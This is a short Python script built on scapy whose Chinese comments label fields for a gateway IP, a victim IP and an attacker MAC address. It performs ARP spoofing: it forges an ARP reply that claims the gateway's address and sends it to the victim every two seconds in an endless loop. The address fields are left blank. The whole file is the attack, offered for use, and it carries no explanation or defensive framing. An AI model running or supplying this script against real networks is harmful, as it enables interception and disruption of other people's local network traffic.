from scapy.all import *


def main():
    gatewayIP = ''  # 网关ip
    victimIP = ''  # 受害者ip

    hackMAC = ''  # 攻击者的mac地址
    victimMAC = ''  # 受害者的mac地址

    # print(getmacbyip(''))

    packet = Ether() / ARP(psrc=gatewayIP, pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())

    pass


if __name__ == '__main__':
    main()